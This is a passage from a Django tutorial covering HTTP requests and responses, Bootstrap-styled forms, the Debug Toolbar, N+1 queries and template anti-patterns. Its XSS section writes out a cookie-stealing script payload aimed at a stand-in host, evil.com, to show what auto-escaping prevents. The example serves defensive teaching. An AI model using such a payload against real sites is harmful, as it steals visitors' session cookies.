    request.META['HTTP_HOST']          # 'localhost:8000'
    request.META['REMOTE_ADDR']        # Client IP address
    request.META['HTTP_USER_AGENT']    # browser
```

### HTTP Request structure

```
GET /notes/42/ HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 ...
Accept: text/html,application/xhtml+xml,...
Accept-Language: uk,en;q=0.9
Cookie: sessionid=abc123def456; csrftoken=xyz789
```

**Key headers for Django:**
- `Cookie: sessionid=...` → Django reads the session → `request.user`
- `Cookie: csrftoken=...` → Django checks CSRF on POST
- `Accept-Language` → Django i18n/l10n

### HttpResponse — what Django returns

Django has several response types for different scenarios. `redirect()` returns a 302 code, `raise Http404` returns a 404. `get_object_or_404()` is a convenient shortcut that automatically raises a 404 if the object is not found in the DB.

```python
from django.http import (
    HttpResponse,
    HttpResponseRedirect,
    HttpResponseNotFound,
    JsonResponse,
    Http404,
)
from django.shortcuts import render, redirect, get_object_or_404

# Plain text (for testing)
return HttpResponse("Hello, Django!")

# HTML via render() — the most common option
return render(request, 'notes_app/note_list.html', context)

# Redirect (after POST → the PRG pattern)
return redirect('notes_app:note_list')
return HttpResponseRedirect('/notes/')

# 404 via an exception (Django will show the 404.html page)
raise Http404("Нотатку не знайдено")

# Or via get_object_or_404 (automatically)
note = get_object_or_404(Note, pk=pk)

# JSON for AJAX requests
return JsonResponse({'status': 'ok', 'id': note.pk})
return JsonResponse({'errors': form.errors}, status=400)
```

### HTTP Response structure

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: sessionid=abc123; HttpOnly; SameSite=Lax
X-Frame-Options: DENY
X-Content-Type-Options: nosniff

<!DOCTYPE html>
<html>...the full HTML document...</html>
```

**Django status codes:**

| Code | What it means | Where in Django |
|-----|-----------|------------|
| `200 OK` | Success | `HttpResponse()` by default |
| `201 Created` | Resource created | `JsonResponse(status=201)` |
| `301 Moved Permanently` | Permanent redirect | `redirect(..., permanent=True)` |
| `302 Found` | Temporary redirect | `redirect(...)` |
| `400 Bad Request` | Client error | `HttpResponse(status=400)` |
| `403 Forbidden` | No permission | `PermissionDenied` exception |
| `404 Not Found` | Not found | `raise Http404` |
| `500 Server Error` | Server error | Uncaught exception |

---

---
- **🧠 Mental model:** Django Forms are a "smart intermediary" between the browser and the database. Imagine the form as a security guard: it checks every field, rejects invalid data BEFORE it reaches the DB, and returns clear error messages.
- **📚 Why it exists:** Without Django Forms you would have to manually parse `request.POST`, check every field, generate error messages, and protect against SQL injection and XSS. Django Forms does all of this automatically and correctly.
- **🌐 What happens under the hood:** `form.is_valid()` runs the full validation cycle: first `to_python()` (type conversion), then `validate()` (built-in validation), then `run_validators()` (custom validators), and finally `clean()` (cross-field validation). If any step fails, `is_valid()` returns `False` and `form.errors` contains detailed messages.
- **❌ Common beginner mistake:** Calling `form.save()` without first checking `form.is_valid()`. Or not using the PRG pattern after a successful save — which leads to duplicate records when the page is refreshed.
---

## 7. Bootstrap Forms + Django Forms

**4 strategies for integrating Bootstrap with Django Forms — from maximum control to minimum code:**
```
Manual HTML       → maximum control, the most code
Widget attrs      → medium control, less code
django-bootstrap5 → minimum code, less flexibility
crispy-forms      → the best balance (more details: ADVANCED_TEMPLATES.md)
```

**Why Django Forms exist — the full cycle:**
```
GET request (show an empty form):
  form = NoteForm()         ← an empty form with no data
  render(template, {'form': form})  ← show a clean form

POST request (invalid data):
  form = NoteForm(request.POST)  ← fill the form with data
  form.is_valid()           ← returns False
  render(template, {'form': form})  ← show the form with errors and the entered data

POST request (valid data):
  form = NoteForm(request.POST)
  form.is_valid()           ← returns True
  form.save()               ← write to the database
  redirect(...)             ← PRG pattern (Post-Redirect-Get)
```

### Strategies for connecting Bootstrap to a Django Form

```
Option 1: Manual HTML                 → full control, a lot of code
Option 2: Custom widgets              → widgets with class='form-control'
Option 3: django-bootstrap5           → {% bootstrap_form form %}
Option 4: django-crispy-forms         → the most flexible, FormHelper layouts
```

### Anatomy of a single Bootstrap + Django form field

Before looking at the full template, understand what happens for ONE field. Each field consists of four HTML elements:

```
┌─────────────────────────────────────────────────┐
│ <div class="mb-3">          ← spacing between fields │
│   <label>                   ← field label        │
│     {{ form.title.label }}  ← "Заголовок"        │
│   </label>                                       │
│                                                  │
│   <input class="form-control   ← Bootstrap style │
│           is-invalid">         ← if there is an error │
│     value="{{ form.title.value }}" ← current     │
│   />                                             │
│                                                  │
│   <div class="invalid-feedback"> ← only on      │
│     {{ error }}                  ← error         │
│   </div>                                         │
│ </div>                                           │
└─────────────────────────────────────────────────┘
```

**Key Django form attributes in the template:**
- `form.title.id_for_label` → `"id_title"` (Django generates the ID automatically)
- `form.title.html_name` → `"title"` (the name for the input's `name=""` attribute)
- `form.title.value` → the current value of the field (empty for a new form, or the entered data on a validation error)
- `form.title.errors` → the list of errors (empty on success)
- `form.title.field.required` → `True`/`False` (from the Model definition)

**Why `novalidate` on the `<form>`:** Without `novalidate` the browser performs HTML5 validation of `required` fields BEFORE submitting the form. This "breaks" the UX: browser error hints look different in different browsers and are not controlled by Django. With `novalidate` all validation happens on the server, and Django's form.errors is the single, consistent way of displaying errors.

### Option 1: Manual HTML (maximum control)

This template shows the MOST DETAILED way of rendering a form. Notice `form.title.id_for_label` — Django automatically generates an ID for every form field. Notice the conditional `is-invalid` class — it highlights the field in red only if there are errors. Notice `form.non_field_errors` — these are errors from the form's `clean()` method that relate not to a single field but to the whole form.

```html
{% block content %}
<div class="row justify-content-center">
    <div class="col-md-8 col-lg-6">
        <div class="card border-0 shadow-sm">
            <div class="card-header bg-white">
                <h4 class="mb-0">Нова нотатка</h4>
            </div>
            <div class="card-body">
                <form method="post" novalidate>
                    {% csrf_token %}

                    {# The title field #}
                    <div class="mb-3">
                        <label for="{{ form.title.id_for_label }}" class="form-label fw-semibold">
                            {{ form.title.label }}
                            {% if form.title.field.required %}
                            <span class="text-danger">*</span>
                            {% endif %}
                        </label>
                        <input
                            type="text"
                            class="form-control {% if form.title.errors %}is-invalid{% endif %}"
                            id="{{ form.title.id_for_label }}"
                            name="{{ form.title.html_name }}"
                            value="{{ form.title.value|default:'' }}"
                            placeholder="Заголовок нотатки"
                        >
                        {% for error in form.title.errors %}
                        <div class="invalid-feedback">{{ error }}</div>
                        {% endfor %}
                    </div>

                    {# The content field #}
                    <div class="mb-3">
                        <label for="{{ form.content.id_for_label }}" class="form-label fw-semibold">
                            {{ form.content.label }}
                        </label>
                        <textarea
                            class="form-control {% if form.content.errors %}is-invalid{% endif %}"
                            id="{{ form.content.id_for_label }}"
                            name="{{ form.content.html_name }}"
                            rows="6"
                            placeholder="Текст нотатки..."
                        >{{ form.content.value|default:'' }}</textarea>
                        {% for error in form.content.errors %}
                        <div class="invalid-feedback">{{ error }}</div>
                        {% endfor %}
                        <div class="form-text">Необов'язкове поле</div>
                    </div>

                    {# Non-field errors (for example, from clean()) #}
                    {% if form.non_field_errors %}
                    <div class="alert alert-danger">
                        {% for error in form.non_field_errors %}
                        <p class="mb-0">{{ error }}</p>
                        {% endfor %}
                    </div>
                    {% endif %}

                    <div class="d-flex gap-2">
                        <button type="submit" class="btn btn-primary">Зберегти</button>
                        <a href="{% url 'notes_app:note_list' %}"
                           class="btn btn-outline-secondary">Скасувати</a>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>
{% endblock %}
```

### Option 2: Widgets with Bootstrap classes

This approach moves the Bootstrap class configuration into `forms.py`. The template becomes much shorter — it only iterates over the form fields. The `clean_title` method shows how to add custom validation for an individual field: it always starts with `clean_` + the field name and always returns the cleaned value.

```python
# forms.py
from django import forms
from .models import Note

class NoteForm(forms.ModelForm):
    class Meta:
        model = Note
        fields = ['title', 'content']
        widgets = {
            'title': forms.TextInput(attrs={
                'class': 'form-control',
                'placeholder': 'Заголовок нотатки',
            }),
            'content': forms.Textarea(attrs={
                'class': 'form-control',
                'rows': 6,
                'placeholder': 'Текст нотатки...',
            }),
        }
        labels = {
            'title': 'Заголовок',
            'content': 'Текст',
        }
        help_texts = {
            'content': 'Необов\'язкове поле.',
        }

    def clean_title(self):
        title = self.cleaned_data['title']
        if len(title) < 3:
            raise forms.ValidationError('Заголовок має бути не менше 3 символів.')
        return title.strip()
```

This template is shorter than Option 1 because the Bootstrap class `form-control` is already in the Widget. `{{ field }}` renders the full `<input>` or `<textarea>` with all the attributes set in the Widget. Iterating with `{% for field in form %}` lets you handle all fields the same way.

```html
{# Template — a shorter option via form.as_p() or iteration #}
<form method="post">
    {% csrf_token %}
    {% for field in form %}
    <div class="mb-3">
        <label for="{{ field.id_for_label }}" class="form-label">
            {{ field.label }}{% if field.field.required %} *{% endif %}
        </label>
        {{ field }}  {# ← renders an input with class='form-control' from the Widget #}
        {% if field.errors %}
            {% for error in field.errors %}
            <div class="text-danger small mt-1">{{ error }}</div>
            {% endfor %}
        {% endif %}
        {% if field.help_text %}
        <div class="form-text">{{ field.help_text }}</div>
        {% endif %}
    </div>
    {% endfor %}
    <button type="submit" class="btn btn-primary">Зберегти</button>
</form>
```

### Option 3: django-bootstrap5 (the fastest)

The `django-bootstrap5` library generates full Bootstrap markup for every form field. `{% bootstrap_form form %}` renders all fields with the correct label, help_text and error styles automatically. The price is less control over the markup.

```bash
pip install django-bootstrap5
```

```python
# settings.py
INSTALLED_APPS = [..., 'django_bootstrap5']
```

```html
{% load django_bootstrap5 %}
{% bootstrap_css %}
{% bootstrap_javascript %}

<form method="post">
    {% csrf_token %}
    {% bootstrap_form form %}
    {% bootstrap_button "Зберегти" button_type="submit" button_class="btn-primary" %}
    <a href="{% url 'notes_app:note_list' %}" class="btn btn-outline-secondary ms-2">
        Скасувати
    </a>
</form>
```

### Bootstrap Validation — Server + Client

This view shows the full CRUD cycle with validation. Notice `messages.success()` — the message is stored in the session and displayed in `base.html` via `{% if messages %}`. Notice `redirect()` after `form.save()` — this is the PRG pattern, which prevents data duplication when the page is refreshed.

```python
# views.py
from django.contrib import messages

def note_create(request):
    if request.method == 'POST':
        form = NoteForm(request.POST)
        if form.is_valid():
            note = form.save()
            messages.success(request, f'Нотатку "{note.title}" успішно збережено!')
            return redirect('notes_app:note_list')  # PRG pattern
        else:
            messages.error(request, 'Виправте помилки у формі.')
    else:
        form = NoteForm()
    return render(request, 'notes_app/note_form.html', {'form': form})
```

```
Validation Architecture:
1. HTML5 validation (browser) → disabled via novalidate
2. Django form.is_valid()     → server-side validation
3. form.errors → template     → Bootstrap .is-invalid styles
4. messages framework         → Bootstrap alert
```

> **Critical anti-pattern:** Relying only on color (red borders)
> for error messages fails for people with color blindness and for screen readers.
> Always add a text message via `.invalid-feedback`.

---

---
- **🧠 Mental model:** The Django Debug Toolbar is an "X-ray" for your Django application. A regular browser shows only the HTML result. DjDT shows everything that happened INSIDE: how many SQL queries ran, which context the template received, how long each middleware took.
- **📚 Why it exists:** Without DjDT you are "blind" — you see only the end result. With DjDT you see N+1 problems (51 SQL queries instead of 1), the exact template context, and the execution time of every query. It is an indispensable optimization tool.
- **🌐 What happens under the hood:** DjDT is installed as middleware. It intercepts every request, collects statistics (SQL via Django ORM logging, templates via signal hooks, signals via Django's signal framework), and injects its panel into the HTML response before `</body>`.
- **❌ Common beginner mistake:** Looking at the page and thinking "everything is fine, 15 notes are displayed". DjDT opens and shows: 152 SQL queries in 2.3 seconds. Without DjDT this problem is invisible until the site goes down under load.
---

## 8. Django Debug Toolbar — Inspecting templates

**The PRG Pattern (Post-Redirect-Get) — why it is mandatory:**

```
The problem WITHOUT PRG:
  1. The user submits the form (POST /notes/create/)
  2. Django saves the record in the DB and returns HTML with the page
  3. The user presses F5 (refresh)
  4. The browser asks: "Resend the POST data?"
  5. The user clicks OK → Django saves again → a DUPLICATE in the DB!

The PRG Pattern (Post-Redirect-Get):
  1. The user submits the form (POST /notes/create/)
  2. Django saves the record in the DB and returns a REDIRECT 302 → /notes/
  3. The browser automatically makes a GET /notes/
  4. Django returns the HTML list of notes
  5. The user presses F5 → a safe GET → no duplicate!
```

**The N+1 Problem — the most common Django performance problem:**

```
A list of 50 notes, each one shows {{ note.author.username }}

Without select_related (the N+1 problem):
  SQL #1: SELECT * FROM notes ORDER BY created_at (50 rows)
  SQL #2: SELECT * FROM users WHERE id=1   ← for note 1
  SQL #3: SELECT * FROM users WHERE id=7   ← for note 2
  ...
  SQL #51: SELECT * FROM users WHERE id=N  ← for note 50
  = 51 SQL queries! For 1000 notes = 1001 queries!

With select_related('author'):
  SQL #1: SELECT notes.*, users.* FROM notes JOIN users ON notes.author_id=users.id
  = 1 SQL query! Regardless of the number of notes.

The fix in the view:
  notes = Note.objects.all().select_related('author')
```

### SQL Panel — find the N+1 problem

The DjDT SQL Panel shows EVERY SQL query separately with its execution time. If you see 101 queries for a page with 100 records, that is the classic N+1 problem. Click EXPLAIN on a suspicious query to see the PostgreSQL execution plan.

```
The DjDT SQL Panel shows:
────────────────────────────────────────────────────────
#  | Time  | SQL
── | ────── | ────────────────────────────────────────
1  | 0.3ms  | SELECT * FROM notes_app_note ORDER BY -created_at
2  | 0.1ms  | SELECT * FROM auth_user WHERE id=1      ← duplicate!
3  | 0.1ms  | SELECT * FROM auth_user WHERE id=1      ← duplicate!
...
101| 0.1ms  | SELECT * FROM auth_user WHERE id=N      ← the N+1 problem
────────────────────────────────────────────────────────
101 queries | 12.4ms total
```

**The EXPLAIN button:** next to each SELECT → the query execution plan from PostgreSQL.
It shows whether an INDEX or a FULL SCAN is used.

### Templates Panel — inspecting the context

The Templates Panel shows the EXACT context dictionary the template received. This is the most important tool for debugging "why the variable is not displayed" — you see real data, not assumptions. Note: `user` and `request` are in the context automatically thanks to the context processors in settings.py.

```
DjDT Templates Panel:
────────────────────────────────────────────────────────
notes_app/note_list.html (base → notes_app/base.html)
    ↓ Toggle context ↓
{
    'notes': <QuerySet [<Note: Перша>, <Note: Друга>]>,
    'total': 2,
    'user_name': 'admin',
    'is_staff': True,
    'request': <WSGIRequest GET '/notes/'>,
    'user': <User: admin>    ← automatically via a context_processor
}
```

> **If a variable is not displayed:** open Context in DjDT.
> Is it in the dictionary? Is the name correct? Isn't it `userid` instead of `user_id`?

---

---
- **🧠 Mental model:** Anti-patterns in templates are like "cracks in a wall". Right now they seem harmless. But every crack grows: a hardcoded URL will break during restructuring, business logic in a template will become untestable, a missing `|escape` will open an XSS vulnerability.
- **📚 Why it exists:** These anti-patterns appear because "it's easier right now". But in real projects "easy right now" → "very expensive later". Knowing the anti-patterns saves you from technical debt.
- **🌐 What happens under the hood:** XSS (Cross-Site Scripting) is an attack in which an attacker injects JavaScript into a page through user-generated content. Django automatically escapes `{{ }}` output, turning `<script>` into `&lt;script&gt;`. `|safe` TURNS OFF this protection — use it ONLY for content you trust 100%.
- **❌ Common beginner mistake:** Hardcoding URLs in templates, `href="/notes/"`, instead of `{% url 'notes_app:note_list' %}`. Or writing `{{ comment.text|safe }}` for user comments — that is a direct XSS vulnerability.
---

## 9. Anti-patterns and common mistakes

**XSS (Cross-Site Scripting) — how Django protects you and where the danger is:**

```
WITHOUT Django auto-escaping (or with |safe for user input):
  The attacker enters into the "Name" field: <script>document.location='evil.com?c='+document.cookie</script>
  {{ user.name|safe }} → renders it as a REAL SCRIPT TAG
  → The browser EXECUTES the attacker's script!
  → The attacker gets the cookies of every visitor to the page!

With Django auto-escaping (the default):
  {{ user.name }} → renders as:
  &lt;script&gt;document.location='evil.com?c='+document.cookie&lt;/script&gt;
  → The browser shows TEXT and does not execute the script
  → The attack failed!

Security rules:
  {{ user_content }}        ← SAFE (auto-escape enabled)
  {{ user_content|safe }}   ← DANGEROUS for user input, safe for your own content
  {{ user_content|striptags }} ← SAFE (removes HTML tags)
  {{ user_content|escape }} ← explicit escaping (redundant, but harmless)
```

### Template Anti-patterns

Business logic in a template is not only architecturally wrong but also impractical: template conditions cannot be unit-tested, cannot be reused, and are hard to debug. Move the logic into the view and pass a ready-made boolean.

```python
# ❌ Business logic in the template
{% if notes|length > 10 and user.subscription.plan == 'pro' %}
    {# Logic that is not tested and not reusable #}
{% endif %}

# ✅ Logic in the View — the template receives a ready result
# views.py
can_see_all = user.subscription.plan == 'pro' and notes.count() > 10
return render(request, '...', {'can_see_all': can_see_all})
```

Hardcoded URLs are technical debt. When the URL structure changes (and it always does), you will have to find and replace them in every template. `{% url %}` updates automatically.

```python
# ❌ A hardcoded URL in the template
<a href="/notes/{{ note.pk }}/">Читати</a>

# ✅ A safe named link
<a href="{% url 'notes_app:note_detail' pk=note.pk %}">Читати</a>
```

```python
# ❌ Hardcoded static URLs
<link rel="stylesheet" href="/static/css/style.css">

# ✅ A dynamic link
{% load static %}
<link rel="stylesheet" href="{% static 'notes_app/css/style.css' %}">
```

HTML in a Python View violates the MVT architecture. A view should not know about HTML. It also opens XSS vulnerabilities if strings are not escaped, and makes scaling impossible (how do you edit HTML inside a Python string?).

```html
{# ❌ HTML in a Python View #}
def my_view(request):
    return HttpResponse("<h1>Hello</h1><p>...</p>")
{# Breaks MVT, impossible to scale, XSS bugs #}

{# ✅ Always through a template #}
def my_view(request):
    return render(request, 'my_template.html', {'name': 'World'})
```

A missing CSRF token — Django will return `403 Forbidden` on POST. This is not a bug — it is protection. If you see a 403 when submitting a form, check whether `{% csrf_token %}` is the first line inside the `<form>`.

```html
{# ❌ A POST form without csrf_token #}
<form method="post">
    <input name="title">
    <button type="submit">Save</button>
</form>
{# → Django will return 403 Forbidden #}

{# ✅ Always add it #}
<form method="post">
    {% csrf_token %}
    ...
</form>
```

### Secure Template Output

Auto-escaping in Django is active by default for all `{{ }}` output. `|safe` is a "protection off switch" — use it ONLY when you are absolutely sure the content is safe (for example, HTML generated by Django itself, or content from a trusted markdown parser). NEVER apply `|safe` to user-generated content.

```html
{# Django escapes {{ }} automatically — protection against XSS #}
{# If user.bio = '<script>alert("xss")</script>' #}
{{ user.bio }}
{# → &lt;script&gt;alert("xss")&lt;/script&gt; — safe text #}

{# |safe — TURNS OFF the protection! Only for TRUSTED HTML #}
{{ article.body|safe }}
{# ← Dangerous for user-generated content! #}

{# A safe alternative for HTML content #}
{{ article.body|striptags }}       {# remove the tags, keep the text #}
{{ article.body|linebreaks }}      {# \n → <p>, safe #}
```

---

## 10. Self-check questions

1. The template says `{{ user_id }}`, but the view passes `{'userid': 42}`. What will the browser show? Will the server crash?
2. Why MUST `{% extends 'base.html' %}` be the first line of the template?
3. What is the difference between `{% include %}` and `{% extends %}`? When should you use each?
4. The view did not pass the `notes` variable in the context. The template has `{% for note in notes %}`. What will happen?
5. Why is a redirect needed after a successful POST (the PRG pattern)? What happens without it?
6. `{% url 'note_detail' pk=note.pk %}` cannot find the URL. Why? What are the possible reasons?
7. `{% csrf_token %}` in a GET form (search). Is it needed? Why?
8. The form returns an error, but the field is highlighted green instead of red. Where should you look for the bug?
9. `{{ article.body|safe }}` — when is this acceptable and when is it dangerous?
10. The Django Debug Toolbar SQL Panel shows 150 queries for a page with 15 notes. What is the likely cause and how do you fix it?
